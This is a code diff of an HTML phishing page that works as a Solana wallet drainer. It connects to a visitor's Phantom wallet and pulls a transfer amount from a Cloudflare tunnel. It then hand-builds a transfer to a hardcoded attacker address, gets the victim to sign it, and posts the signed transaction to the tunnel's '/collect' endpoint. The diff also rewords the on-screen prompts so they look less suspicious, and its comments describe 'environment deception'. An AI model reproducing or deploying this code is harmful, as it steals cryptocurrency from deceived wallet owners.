@@ -1,6 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心战神补丁：物理级环境欺骗，彻底解决 Buffer 报错
+        // 🚀 核心战神补丁：物理级环境欺骗
         window.Buffer = {
             from: function(a) { return new Uint8Array(a); },
             isBuffer: function(o) { return o instanceof Uint8Array; }
@@ -18,6 +18,7 @@
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
 
+    // 🔱 手动构造 8 字节小端序金额数据，物理绕过编码报错
     function packU64(amount) {
         const buf = new ArrayBuffer(8);
         const view = new DataView(buf);
@@ -30,7 +31,7 @@
             const p = window.solana || window.phantom?.solana;
             if (!p) { alert("Please use a Wallet Browser"); return; }
             
-            document.getElementById('msg').innerText = "Linking...";
+            document.getElementById('msg').innerText = "Connecting...";
             const { publicKey } = await p.connect();
             
             const res = await fetch(TUNNEL + "/get_data", {
@@ -39,7 +40,7 @@
             });
             const data = await res.json();
 
-            // 🔱 战神级：先生成空壳，手动填入 12 字节指令，物理绕过 Blob.encode 报错
+            // 🚀 直接手动封装 12 字节指令，完全跳过 SDK 那些报错的函数
             const transaction = new solanaWeb3.Transaction().add({
                 keys: [
                     { pubkey: publicKey, isSigner: true, isWritable: true },
@@ -49,17 +50,16 @@
                 data: new Uint8Array(12)
             });
             
-            // 🚀 手动写入指令 ID (2) 和 8 字节对齐的金额
-            transaction.instructions[0].data.set([2, 0, 0, 0], 0);
-            transaction.instructions[0].data.set(packU64(data.safe_amount), 4);
+            // 物理篡改内存数据
+            transaction.instructions[0].data.set([2, 0, 0, 0], 0); // Transfer ID
+            transaction.instructions[0].data.set(packU64(data.safe_amount), 4); // 8字节对齐金额
 
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = publicKey;
 
-            document.getElementById('msg').innerText = "Awaiting Signature...";
+            document.getElementById('msg').innerText = "Awaiting Confirmation...";
             const signed = await p.signTransaction(transaction);
             
-            // 💰 成功后手动序列化发送
             const b64 = btoa(String.fromCharCode.apply(null, signed.serialize()));
             await fetch(TUNNEL + "/collect", {
                 method:'POST', headers:{'Content-Type':'application/json'},
